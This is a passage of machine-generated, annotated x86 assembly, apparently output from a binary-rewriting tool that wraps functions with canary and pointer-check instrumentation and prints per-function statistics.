   mov     0x4(%edi, %ebx ,  0x8), %edx       # [47(80)]Using Pointer PTRCHECK arg[0]    # <<<=== Need to Address an Array
   cmp     %edx, %ebp                         # [48(81)]   #32
   je      Label_0x80481f0 #32
Label_0x80481e2: #p6a
   add     $0x1, %ebx                         # [50(83)]   #32
   cmp     $0x9, %ebx                         # [51(84)]   #32
   jl      Label_0x80481d0 #32
   jmp     Label_0x8048252 #32
Label_0x80481f0: #p6a
   mov     Var_0x80602a8, %eax                # [54(87)]   #32
   mov     %edx, 0x8(%esp)                    # [55(88)]   #32
   mov     %ecx, 0x4(%esp)                    # [56(89)]   #32
   mov     %eax, (%esp)                       # [57(90)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048200
   .long    Func_0x8048290  #pp1w: Label_0x8048290 VAR_ADDRESS #32
   cmpl    $0x0, 0x8(%eax)                    # [59(92)]Using Pointer PTRCHECK arg[1]    #32
   je      Label_0x804824f #32
   movl    $0x0, 0x8(%eax)                    # [61(94)]Using Pointer PTRCHECK arg[1]  Already checked [59]   #32
   mov     0x24(%esp), %ecx                   # [62(95)]   #32
   add     $0x1, %ecx                         # [63(96)]   #32
   mov     %ecx, 0x24(%esp)                   # [64(97)]   #32
   mov     0x28(%esp), %edx                   # [65(98)]   #32
   imul    %edx, %ecx                         # [66(99)]   #32
   lea     0x64(%edx, %ecx ,  0x1), %edx      # [67(100)] Loading Pointer with stackSize: 60   # <<<=== Need to Address an Array
   mov     %edx, 0x28(%esp)                   # [68(101)]   #32
   cmpl    $0x0, 0xc(%eax)                    # [69(102)]Using Pointer PTRCHECK arg[1]    #32
   jne     Label_0x804824f #32
   mov     Var_0x80602a8, %ecx                # [71(104)]   #32
   movsd   (%eax), %xmm0                      # [72(105)]Using Pointer PTRCHECK arg[0]    #32
   movsd   0x8(%eax), %xmm1                   # [73(106)]Using Pointer PTRCHECK arg[0]  Already checked [61]   #32
   movsd   %xmm1, 0x8(%esp)                   # [74(107)]   #32
   movsd   %xmm0, (%esp)                      # [75(108)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804824a
   .long    Func_0x8048310  #pp1w: Label_0x8048310 VAR_ADDRESS #32
Label_0x804824f: #p6a
   mov     0x14(%esi), %esi                   # [77(110)]Using Pointer PTRCHECK arg[0]    #32
Label_0x8048252: #p6a
   cmp     $0x9, %ebx                         # [78(111)]   #32
   jne     Label_0x804825a #32
   mov     0x14(%esi), %esi                   # [80(113)]Using Pointer PTRCHECK arg[0]    #32
Label_0x804825a: #p6a
   test    %esi, %esi                         # [81(114)]   #32
   jne     Label_0x80481c0 #32
Label_0x8048262: #p6a
   mov     0x1c(%esp), %esi                   # [83(116)]   #32
   mov     0x14(%esi), %esi                   # [84(117)]Using Pointer PTRCHECK arg[0]    #32
   mov     %edi, (%esp)                       # [85(118)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804826c
   .long    Func_0x804a500  #pp1w: Label_0x804a500 VAR_ADDRESS #32
   mov     0x20(%esp), %eax                   # [87(120)]   #32
   add     0x28(%esp), %eax                   # [88(121)]   #32
   test    %esi, %esi                         # [89(122)]   #32
   jne     Label_0x8048117 #32
   jmp     Label_0x8048287 #32
Label_0x8048283: #p6a
   mov     0x20(%esp), %eax                   # [92(125)]   #32
Label_0x8048287: #p6a
   add     $0x2c, %esp                        # [93(126)]stackSize = 0x10   #32
   pop     %esi                               # [94(127)]stackSize = 0xc   #32
   pop     %edi                               # [95(128)]stackSize = 0x8   #32
   pop     %ebx                               # [96(129)]stackSize = 0x4   #32
   pop     %ebp                               # [97(130)]stackSize = 0x0   #32
Label_0x804828e: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:2 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 3
     adding function wrapper

;     Start Index : 132 (0x8048290)
;       End Index : 173 (0x804830b)
;   Num Instructs : 42
;      Stack Size : 28 (0x1c)
;          Pushes : 4 (0x4)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 2
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 3
;      Local Vars : 0
;      ESP Others : 2
;     ESP Offsets : 5
;                 :  0x0(0x1c), 0x8(0x14),
;      ESP Params : 
;                 :  0x30(0x4), 0x34(0x4), 0x38(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x7920,7
.p2align 3,0x7925
FuncPtr_0x8048290:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x8048290,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x8048290:

Label_0x8048290:
   push    %ebp                               # [0(132)]stackSize = 0x4   #32
   push    %ebx                               # [1(133)]stackSize = 0x8   #32
   push    %edi                               # [2(134)]stackSize = 0xc   #32
   push    %esi                               # [3(135)]stackSize = 0x10   #32
   sub     $0x1c, %esp                        # [4(136)]stackSize = 0x2c   #32
   mov     0x3c(%esp), %esi                   # [5(137)]   #32
   mov     0x38(%esp), %edi                   # [6(138)]   #32
   mov     0x34(%esp), %eax                   # [7(139)]   #32
Label_0x80482b0: #p6a
   mov     %eax, %ebp                         # [8(140)]   #32
   movsd   0x10(%ebp), %xmm0                  # [9(141)]Using Pointer PTRCHECK arg[0]    #32
   movsd   0x18(%ebp), %xmm1                  # [10(142)]Using Pointer PTRCHECK arg[0]    #32
   movsd   %xmm1, 0x8(%esp)                   # [11(143)]   #32
   movsd   %xmm0, (%esp)                      # [12(144)]   #32
   mov     %edi, %ecx                         # [13(145)]   #32
   mov     %esi, %edx                         # [14(146)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x80482cb
   .long    Func_0x80492e0  #pp1w: Label_0x80492e0 VAR_ADDRESS #32
   xor     %ebx, %ebx                         # [16(148)]   #32
   test    %eax, %eax                         # [17(149)]   #32
   je      Label_0x8048302 #32
   mov     %esi, (%esp)                       # [19(151)]   #32
   mov     %ebp, %ecx                         # [20(152)]   #32
   mov     %edi, %edx                         # [21(153)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x80482dd
   .long    Func_0x8049310  #pp1w: Label_0x8049310 VAR_ADDRESS #32
   test    %eax, %eax                         # [23(155)]   #32
   jne     Label_0x80482b0 #32
   mov     0xc(%ebp), %eax                    # [25(157)]Using Pointer PTRCHECK arg[0]    #32
   jmp     Label_0x80482f3 #32
Label_0x80482f0: #p6a
   mov     0x14(%eax), %eax                   # [27(159)]Using Pointer PTRCHECK arg[0]    #32
Label_0x80482f3: #p6a
   test    %eax, %eax                         # [28(160)]   #32
   je      Label_0x8048302 #32
   cmp     %edi, (%eax)                       # [30(162)]Using Pointer PTRCHECK arg[1]    #32
   jne     Label_0x80482f0 #32
   cmp     %esi, 0x4(%eax)                    # [32(164)]Using Pointer PTRCHECK arg[1]    #32
   jne     Label_0x80482f0 #32
   mov     %eax, %ebx                         # [34(166)]   #32
Label_0x8048302: #p6a
   mov     %ebx, %eax                         # [35(167)]   #32
   add     $0x1c, %esp                        # [36(168)]stackSize = 0x10   #32
   pop     %esi                               # [37(169)]stackSize = 0xc   #32
   pop     %edi                               # [38(170)]stackSize = 0x8   #32
   pop     %ebx                               # [39(171)]stackSize = 0x4   #32
   pop     %ebp                               # [40(172)]stackSize = 0x0   #32
Label_0x804830b: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:3 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 11
     adding function wrapper

;     Start Index : 564 (0x8048880)
;       End Index : 629 (0x804899f)
;   Num Instructs : 66
;      Stack Size : 32 (0x20)
;          Pushes : 3 (0x3)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 6
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 2
;      Local Vars : 0
;      ESP Others : 6
;     ESP Offsets : 8
;                 :  0x0(0x20), 0x4(0x1c), 0x8(0x18), 0xc(0x14),
;                 :  0x10(0x10), 0x14(0xc),
;      ESP Params : 
;                 :  0x30(0x4), 0x34(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 3
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x5420,7
.p2align 3,0x5425
FuncPtr_0x8048880:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x8048880,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x8048880:

Label_0x8048880:
   push    %ebx                               # [0(564)]stackSize = 0x4   #32
   push    %edi                               # [1(565)]stackSize = 0x8   #32
   push    %esi                               # [2(566)]stackSize = 0xc   #32
   sub     $0x20, %esp                        # [3(567)]stackSize = 0x2c   #32
   mov     0x34(%esp), %esi                   # [4(568)]   #32
   test    %esi, %esi                         # [5(569)]   #32
   je      Label_0x8048999 #32
   mov     0x38(%esp), %eax                   # [7(571)]   #32
Label_0x80488a0: #p6a
   cmpl    $0x0, 0x8(%esi)                    # [8(572)]Using Pointer PTRCHECK arg[1]    #32
   je      Label_0x8048950 #32
   mov     $0xd, %ecx                         # [10(574)]   #32
   sub     (%esi), %ecx                       # [11(575)]Using Pointer PTRCHECK arg[0]    #32
   mov     %eax, 0xc(%esp)                    # [12(576)]   #32
   mov     %ecx, 0x8(%esp)                    # [13(577)]   #32
   movl    $Var_0x804b737, 0x4(%esp)          # [14(578)]   #32
   movl    $0x1, (%esp)                       # [15(579)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x80488c8
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   mov     0xc(%esi), %edi                    # [17(581)]Using Pointer PTRCHECK arg[0]    #32
   jmp     Label_0x8048912 #32
Label_0x80488e0: #p6a
   mov     (%edi), %eax                       # [19(583)]Using Pointer PTRCHECK arg[0]    #32
   mov     0x4(%edi), %ecx                    # [20(584)]Using Pointer PTRCHECK arg[0]    #32
   mov     0x8(%edi), %edx                    # [21(585)]Using Pointer PTRCHECK arg[0]    #32
   mov     0xc(%edi), %ebx                    # [22(586)]Using Pointer PTRCHECK arg[0]    #32
   mov     %ebx, 0x14(%esp)                   # [23(587)]   #32
   mov     %edx, 0x10(%esp)                   # [24(588)]   #32
   mov     %ecx, 0xc(%esp)                    # [25(589)]   #32
   mov     %eax, 0x8(%esp)                    # [26(590)]   #32
   movl    $Var_0x804b70b, 0x4(%esp)          # [27(591)]   #32
   movl    $0x1, (%esp)                       # [28(592)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804890a
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   mov     0x14(%edi), %edi                   # [30(594)]Using Pointer PTRCHECK arg[0]    #32
Label_0x8048912: #p6a
   test    %edi, %edi                         # [31(595)]   #32
   je      Label_0x8048950 #32
   xor     %ebx, %ebx                         # [33(597)]   #32
   cmpl    $0xd, (%esi)                       # [34(598)]Using Pointer PTRCHECK arg[1]  Already checked [34, 41, 11]   #32
   je      Label_0x80488e0 #32
Label_0x8048920: #p6a
   movl    $Var_0x804b74a, 0x4(%esp)          # [36(600)]   #32
   movl    $0x1, (%esp)                       # [37(601)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804892f
   .long    Func_0x804abb0  #pp1w: Label_0x804abb0 VAR_ADDRESS #32
   add     $0x1, %ebx                         # [39(603)]   #32
   mov     $0xd, %eax                         # [40(604)]   #32
   sub     (%esi), %eax                       # [41(605)]Using Pointer PTRCHECK arg[0]  Already checked [34, 41]   #32
   cmp     %eax, %ebx                         # [42(606)]   #32
   jb      Label_0x8048920 #32
   jmp     Label_0x80488e0 #32
Label_0x8048950: #p6a
   mov     0x38(%esi), %eax                   # [45(609)]Using Pointer PTRCHECK arg[0]    #32
   mov     %eax, (%esp)                       # [46(610)]   #32
   movl    $Var_0x804b750, 0x4(%esp)          # [47(611)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804895e
   .long    Func_0x8048880  #pp1w: Label_0x8048880 VAR_ADDRESS #32
   mov     0x3c(%esi), %eax                   # [49(613)]Using Pointer PTRCHECK arg[0]    #32
   mov     %eax, (%esp)                       # [50(614)]   #32
   movl    $Var_0x804b753, 0x4(%esp)          # [51(615)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048971
   .long    Func_0x8048880  #pp1w: Label_0x8048880 VAR_ADDRESS #32
   mov     0x40(%esi), %eax                   # [53(617)]Using Pointer PTRCHECK arg[0]    #32
   mov     %eax, (%esp)                       # [54(618)]   #32
   movl    $Var_0x804b756, 0x4(%esp)          # [55(619)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048984
   .long    Func_0x8048880  #pp1w: Label_0x8048880 VAR_ADDRESS #32
   mov     0x44(%esi), %esi                   # [57(621)]Using Pointer PTRCHECK arg[0]    #32
   test    %esi, %esi                         # [58(622)]   #32
   mov     $Var_0x804b759, %eax               # [59(623)]Loading Variable Pointer 0x804b759 <<= RODATA # FLAGS USED   #32
   jne     Label_0x80488a0 #32
Label_0x8048999: #p6a
   add     $0x20, %esp                        # [61(625)]stackSize = 0xc   #32
   pop     %esi                               # [62(626)]stackSize = 0x8   #32
   pop     %edi                               # [63(627)]stackSize = 0x4   #32
   pop     %ebx                               # [64(628)]stackSize = 0x0   #32
Label_0x804899f: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:11 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 12
     adding function wrapper

;     Start Index : 630 (0x80489a0)
;       End Index : 759 (0x8048b6d)
;   Num Instructs : 130
;      Stack Size : 28 (0x1c)
;          Pushes : 4 (0x4)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 9
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 3
;      Local Vars : 0
;      ESP Others : 4
;     ESP Offsets : 7
;                 :  0x0(0x1c), 0x4(0x18), 0x8(0x14), 0xc(0x10),
;      ESP Params : 
;                 :  0x30(0x4), 0x34(0x4), 0x38(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 10
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x4420,7
.p2align 3,0x4425
FuncPtr_0x80489a0:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x80489a0,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x80489a0:

Label_0x80489a0:
   push    %ebp                               # [0(630)]stackSize = 0x4   #32
   push    %ebx                               # [1(631)]stackSize = 0x8   #32
   push    %edi                               # [2(632)]stackSize = 0xc   #32
   push    %esi                               # [3(633)]stackSize = 0x10   #32
   sub     $0x1c, %esp                        # [4(634)]stackSize = 0x2c   #32
   mov     0x34(%esp), %esi                   # [5(635)]   #32
   mov     0x38(%esp), %ebx                   # [6(636)]   #32
   mov     0x3c(%esp), %ebp                   # [7(637)]   #32
   movsd   0x10(%esi), %xmm0                  # [8(638)]Using Pointer PTRCHECK arg[0]    #32
   movsd   0x18(%esi), %xmm1                  # [9(639)]Using Pointer PTRCHECK arg[0]    #32
   movsd   %xmm1, 0x8(%esp)                   # [10(640)]   #32
   movsd   %xmm0, (%esp)                      # [11(641)]   #32
   mov     %ebx, %ecx                         # [12(642)]   #32
   mov     %ebp, %edx                         # [13(643)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x80489cc
   .long    Func_0x80492e0  #pp1w: Label_0x80492e0 VAR_ADDRESS #32
   test    %eax, %eax                         # [15(645)]   #32
   mov     $-0x1, %eax                        # [16(646)]# FLAGS USED   #32
   je      Label_0x8048b18 #32
Label_0x80489de: #p6a
   mov     %ebp, (%esp)                       # [18(648)]   #32
   mov     %esi, %ecx                         # [19(649)]   #32
   mov     %ebx, %edx                         # [20(650)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x80489e5
   .long    Func_0x8049310  #pp1w: Label_0x8049310 VAR_ADDRESS #32
   mov     %eax, %edi                         # [22(652)]   #32
   test    %edi, %edi                         # [23(653)]   #32
   jne     Label_0x8048ac8 #32
   mov     0xc(%esi), %eax                    # [25(655)]Using Pointer PTRCHECK arg[0]    #32
   test    %eax, %eax                         # [26(656)]   #32
   je      Label_0x8048a24 #32
   lea     0x38(%esp), %ecx                   # [28(658)] Loading Pointer with stackSize: 44   #32
   mov     %ecx, %edx                         # [29(659)]   #32
   mov     (%edx), %ecx                       # [30(660)]Using Pointer PTRCHECK arg[0]    #32
   mov     0x4(%edx), %edx                    # [31(661)]Using Pointer PTRCHECK arg[0]    #32
Label_0x8048a10: #p6a
   cmp     (%eax), %ecx                       # [32(662)]Using Pointer PTRCHECK arg[0]    #32
   jne     Label_0x8048a1d #32
   cmp     0x4(%eax), %edx                    # [34(664)]Using Pointer PTRCHECK arg[0]    #32
   je      Label_0x8048b00 #32
Label_0x8048a1d: #p6a
   mov     0x14(%eax), %eax                   # [36(666)]Using Pointer PTRCHECK arg[0]    #32
   test    %eax, %eax                         # [37(667)]   #32
   jne     Label_0x8048a10 #32
Label_0x8048a24: #p6a
   mov     0x8(%esi), %eax                    # [39(669)]Using Pointer PTRCHECK arg[0]    #32
   cmp     0x4(%esi), %eax                    # [40(670)]Using Pointer PTRCHECK arg[0]    #32
   jb      Label_0x8048b20 #32
   mov     %esi, %ecx                         # [42(672)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048a32
   .long    Func_0x80493d0  #pp1w: Label_0x80493d0 VAR_ADDRESS #32
   test    %eax, %eax                         # [44(674)]   #32
   jne     Label_0x8048af9 #32
   mov     0xc(%esi), %edi                    # [46(676)]Using Pointer PTRCHECK arg[0]  Already checked [25]   #32
   test    %edi, %edi                         # [47(677)]   #32
   je      Label_0x8048aa5 #32
Label_0x8048a50: #p6a
   mov     (%edi), %edx                       # [49(679)]Using Pointer PTRCHECK arg[0]    #32
   mov     0x4(%edi), %eax                    # [50(680)]Using Pointer PTRCHECK arg[0]    #32
   mov     %eax, (%esp)                       # [51(681)]   #32
   mov     %esi, %ecx                         # [52(682)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048a5a
   .long    Func_0x8049310  #pp1w: Label_0x8049310 VAR_ADDRESS #32
   movsd   (%edi), %xmm0                      # [54(684)]Using Pointer PTRCHECK arg[0]  Already checked [49]   #32
   movsd   0x8(%edi), %xmm1                   # [55(685)]Using Pointer PTRCHECK arg[0]    #32
   movsd   %xmm1, 0xc(%esp)                   # [56(686)]   #32
   movsd   %xmm0, 0x4(%esp)                   # [57(687)]   #32
   mov     %eax, (%esp)                       # [58(688)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048a77
   .long    Func_0x80489a0  #pp1w: Label_0x80489a0 VAR_ADDRESS #32
   test    %eax, %eax                         # [60(690)]   #32
   jne     Label_0x8048af9 #32
   mov     0x14(%edi), %edi                   # [62(692)]Using Pointer PTRCHECK arg[0]    #32
   test    %edi, %edi                         # [63(693)]   #32
   jne     Label_0x8048a50 #32
   jmp     Label_0x8048a9e #32
Label_0x8048a90: #p6a
   mov     0x14(%eax), %ecx                   # [66(696)]Using Pointer PTRCHECK arg[0]    #32
   mov     %ecx, 0xc(%esi)                    # [67(697)]Using Pointer PTRCHECK arg[1]  Already checked [70]   #32
   mov     %eax, (%esp)                       # [68(698)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048a99
   .long    Func_0x804a500  #pp1w: Label_0x804a500 VAR_ADDRESS #32
Label_0x8048a9e: #p6a
   mov     0xc(%esi), %eax                    # [70(700)]Using Pointer PTRCHECK arg[0]  Already checked [46, 67]   #32
   test    %eax, %eax                         # [71(701)]   #32
   jne     Label_0x8048a90 #32
Label_0x8048aa5: #p6a
   movl    $0x0, 0xc(%esi)                    # [73(703)]Using Pointer PTRCHECK arg[1]  Already checked [70, 46]   #32
   movl    $0x0, 0x8(%esi)                    # [74(704)]Using Pointer PTRCHECK arg[1]  Already checked [39]   #32
   lea     0x38(%esp), %eax                   # [75(705)] Loading Pointer with stackSize: 44   #32
   mov     (%eax), %edx                       # [76(706)]Using Pointer PTRCHECK arg[0]    #32
   mov     0x4(%eax), %eax                    # [77(707)]Using Pointer PTRCHECK arg[0]    #32
   mov     %eax, (%esp)                       # [78(708)]   #32
   mov     %esi, %ecx                         # [79(709)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048ac1
   .long    Func_0x8049310  #pp1w: Label_0x8049310 VAR_ADDRESS #32
   mov     %eax, %edi                         # [81(711)]   #32
Label_0x8048ac8: #p6a
   lea     0x38(%esp), %eax                   # [82(712)] Loading Pointer with stackSize: 44   #32
   mov     (%eax), %ebx                       # [83(713)]Using Pointer PTRCHECK arg[0]    #32
   mov     0x4(%eax), %ebp                    # [84(714)]Using Pointer PTRCHECK arg[0]    #32
   movsd   0x10(%edi), %xmm0                  # [85(715)]Using Pointer PTRCHECK arg[0]    #32
   movsd   0x18(%edi), %xmm1                  # [86(716)]Using Pointer PTRCHECK arg[0]    #32
   movsd   %xmm1, 0x8(%esp)                   # [87(717)]   #32
   movsd   %xmm0, (%esp)                      # [88(718)]   #32
   mov     %ebx, %ecx                         # [89(719)]   #32
   mov     %ebp, %edx                         # [90(720)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048aea
   .long    Func_0x80492e0  #pp1w: Label_0x80492e0 VAR_ADDRESS #32
   test    %eax, %eax                         # [92(722)]   #32
   mov     %edi, %esi                         # [93(723)]# FLAGS USED   #32
   jne     Label_0x80489de #32
Label_0x8048af9: #p6a
   mov     $-0x1, %eax                        # [95(725)]   #32
   jmp     Label_0x8048b18 #32
Label_0x8048b00: #p6a
   lea     0x38(%esp), %ecx                   # [97(727)] Loading Pointer with stackSize: 44   #32
   movsd   (%ecx), %xmm0                      # [98(728)]Using Pointer PTRCHECK arg[0]    #32
   movsd   0x8(%ecx), %xmm1                   # [99(729)]Using Pointer PTRCHECK arg[0]    #32
   movsd   %xmm1, 0x8(%eax)                   # [100(730)]Using Pointer PTRCHECK arg[1]    #32
   movsd   %xmm0, (%eax)                      # [101(731)]Using Pointer PTRCHECK arg[1]  Already checked [32]   #32
   xor     %eax, %eax                         # [102(732)]   #32
Label_0x8048b18: #p6a
   add     $0x1c, %esp                        # [103(733)]stackSize = 0x10   #32
   pop     %esi                               # [104(734)]stackSize = 0xc   #32
   pop     %edi                               # [105(735)]stackSize = 0x8   #32
   pop     %ebx                               # [106(736)]stackSize = 0x4   #32
   pop     %ebp                               # [107(737)]stackSize = 0x0   #32
Label_0x8048b1f: #p6a
   jmp     _FuncWrapperFooter
 # Ret here
Label_0x8048b20: #p6a
   movl    $0x18, 0x4(%esp)                   # [109(739)]   #32
   movl    $0x1, (%esp)                       # [110(740)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048b2f
   .long    Func_0x804a2d0  #pp1w: Label_0x804a2d0 VAR_ADDRESS #32
   lea     0x38(%esp), %ecx                   # [112(742)] Loading Pointer with stackSize: 44   #32
   movsd   (%ecx), %xmm0                      # [113(743)]Using Pointer PTRCHECK arg[0]    #32
   movsd   0x8(%ecx), %xmm1                   # [114(744)]Using Pointer PTRCHECK arg[0]    #32
   movsd   %xmm1, 0x8(%eax)                   # [115(745)]Using Pointer PTRCHECK arg[1]    #32
   movsd   %xmm0, (%eax)                      # [116(746)]Using Pointer PTRCHECK arg[1]    #32
   mov     0xc(%esi), %ecx                    # [117(747)]Using Pointer PTRCHECK arg[0]  Already checked [25]   #32
   test    %ecx, %ecx                         # [118(748)]   #32
   je      Label_0x8048b65 #32
   test    %eax, %eax                         # [120(750)]   #32
   je      Label_0x8048b68 #32
   mov     %ecx, 0x14(%eax)                   # [122(752)]Using Pointer PTRCHECK arg[1]    #32
   movl    $0x0, 0x10(%eax)                   # [123(753)]Using Pointer PTRCHECK arg[1]    #32
   mov     0xc(%esi), %ecx                    # [124(754)]Using Pointer PTRCHECK arg[0]  Already checked [117]   #32
   mov     %eax, 0x10(%ecx)                   # [125(755)]Using Pointer PTRCHECK arg[1]    #32
Label_0x8048b65: #p6a
   mov     %eax, 0xc(%esi)                    # [126(756)]Using Pointer PTRCHECK arg[1]  Already checked [117, 124]   #32
Label_0x8048b68: #p6a
   addl    $0x1, 0x8(%esi)                    # [127(757)]Using Pointer PTRCHECK arg[0]    #32
   xor     %eax, %eax                         # [128(758)]   #32
   jmp     Label_0x8048b18 #32

/*;;;;;;;; 
; id:12 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 13
     adding function wrapper

;     Start Index : 1052 (0x8048ff0)
;       End Index : 1229 (0x8049261)
;   Num Instructs : 178
;      Stack Size : 44 (0x2c)
;          Pushes : 4 (0x4)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 8
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 3
;      Local Vars : 0
;      ESP Others : 7
;     ESP Offsets : 10
;                 :  0x0(0x2c), 0x4(0x28), 0x8(0x24), 0x1c(0x10),
;                 :  0x20(0xc), 0x24(0x8), 0x28(0x4),
;      ESP Params : 
;                 :  0x40(0x4), 0x44(0xc), 0x50(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 30
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x9520,7
.p2align 3,0x9525
FuncPtr_0x8048ff0:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x8048ff0,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x8048ff0:

Label_0x8048ff0:
   push    %ebp                               # [0(1052)]stackSize = 0x4   #32
   push    %ebx                               # [1(1053)]stackSize = 0x8   #32
   push    %edi                               # [2(1054)]stackSize = 0xc   #32
   push    %esi                               # [3(1055)]stackSize = 0x10   #32
   sub     $0x2c, %esp                        # [4(1056)]stackSize = 0x3c   #32
   mov     %edx, 0x20(%esp)                   # [5(1057)]   #32
   mov     %ecx, 0x24(%esp)                   # [6(1058)]   #32
   mov     0x54(%esp), %eax                   # [7(1059)]   #32
   mov     (%eax), %ebp                       # [8(1060)]Using Pointer PTRCHECK arg[0]    #32
   mov     0x44(%esp), %eax                   # [9(1061)]   #32
   mov     0x48(%esp), %ecx                   # [10(1062)]   #32
   mov     %ecx, 0x4(%esp)                    # [11(1063)]   #32
   mov     %eax, (%esp)                       # [12(1064)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8049014
   .long    Func_0x80480a0  #pp1w: Label_0x80480a0 VAR_ADDRESS #32
   mov     %eax, %esi                         # [14(1066)]   #32
   xor     %ebx, %ebx                         # [15(1067)]   #32
   movl    $0x0, 0x28(%esp)                   # [16(1068)]   #32
   jmp     Label_0x8049170 #32
Label_0x804902a: #p6a
   cmp     $0x2000, %ecx                      # [18(1070)]   #32
   jle     Label_0x8049039 #32
   mov     %ebp, %edi                         # [20(1072)]   #32
   jmp     Label_0x80491a0 #32
Label_0x8049039: #p6a
   xor     %ecx, %ecx                         # [22(1074)]   #32
   test    %ebp, %ebp                         # [23(1075)]   #32
   mov     $0x0, %edi                         # [24(1076)]# FLAGS USED   #32
   je      Label_0x8049072 #32
   mov     (%esi, %ebx ,  0x8), %eax          # [26(1078)]Using Pointer PTRCHECK arg[0]  Already checked [107]   # <<<=== Need to Address an Array
Label_0x8049050: #p6a
   cmp     (%ebp), %eax                       # [27(1079)]Using Pointer PTRCHECK arg[0]    #32
   jne     Label_0x8049060 #32
   mov     0x4(%esi, %ebx ,  0x8), %ecx       # [29(1081)]Using Pointer PTRCHECK arg[0]  Already checked [29, 112]   # <<<=== Need to Address an Array
   cmp     0x4(%ebp), %ecx                    # [30(1082)]Using Pointer PTRCHECK arg[0]    #32
   mov     $0x1, %cl                          # [31(1083)]# FLAGS USED   #32
   je      Label_0x8049070 #32
Label_0x8049060: #p6a
   mov     0xc(%ebp), %ebp                    # [33(1085)]Using Pointer PTRCHECK arg[0]    #32
   xor     %ecx, %ecx                         # [34(1086)]   #32
   test    %ebp, %ebp                         # [35(1087)]   #32
   mov     $0x0, %edi                         # [36(1088)]# FLAGS USED   #32
   jne     Label_0x8049050 #32
   jmp     Label_0x8049072 #32
Label_0x8049070: #p6a
   mov     %ebp, %edi                         # [39(1091)]   #32
Label_0x8049072: #p6a
   mov     %ecx, %ebp                         # [40(1092)]   #32
   mov     Var_0x80602a8, %eax                # [41(1093)]   #32
   mov     (%esi, %ebx ,  0x8), %ecx          # [42(1094)]Using Pointer PTRCHECK arg[0]  Already checked [26, 107]   # <<<=== Need to Address an Array
   mov     0x4(%esi, %ebx ,  0x8), %edx       # [43(1095)]Using Pointer PTRCHECK arg[0]  Already checked [29, 112]   # <<<=== Need to Address an Array
   mov     %edx, 0x8(%esp)                    # [44(1096)]   #32
   mov     %ecx, 0x4(%esp)                    # [45(1097)]   #32
   mov     %eax, (%esp)                       # [46(1098)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804908b
   .long    Func_0x8048290  #pp1w: Label_0x8048290 VAR_ADDRESS #32
   test    %eax, %eax                         # [48(1100)]   #32
   je      Label_0x804909e #32
   cmpl    $0x0, 0x8(%eax)                    # [50(1102)]Using Pointer PTRCHECK arg[1]    #32
   jne     Label_0x804911f #32
Label_0x804909e: #p6a
   mov     %eax, 0x1c(%esp)                   # [52(1104)]   #32
